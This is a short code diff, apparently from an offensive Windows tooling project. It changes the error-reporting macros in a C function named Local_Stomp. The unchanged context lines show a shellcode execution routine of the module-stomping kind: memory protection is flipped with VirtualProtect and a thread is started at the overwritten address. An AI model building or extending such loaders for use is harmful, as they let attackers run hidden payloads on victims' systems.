@@ -15,7 +15,7 @@ BOOL Local_Stomp
 
 	if (!VirtualProtect(pAddress, sShellSize, PAGE_READWRITE, &OldProt))
 	{
-		WARN("VirtualProtect Failed! With an Error: %lu", GetLastError());
+		PRINT_ERROR("VirtualProtect");
 		return FALSE;
 	}
 
@@ -27,7 +27,7 @@ BOOL Local_Stomp
 
 	if (!VirtualProtect(pAddress, sShellSize, PAGE_EXECUTE_READ, &OldProt))
 	{
-		WARN("VirtualProtect Failed! With an Error: %lu", GetLastError());
+		PRINT_ERROR("VirtualProtect");
 		return FALSE;
 	}
 
@@ -36,7 +36,7 @@ BOOL Local_Stomp
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
 	if (hThread == NULL)
 	{
-		WARN("CreateThread Failed! With an Error: %lu", GetLastError());
+		PRINT_ERROR("CreateThread");
 		return FALSE;
 	}
 
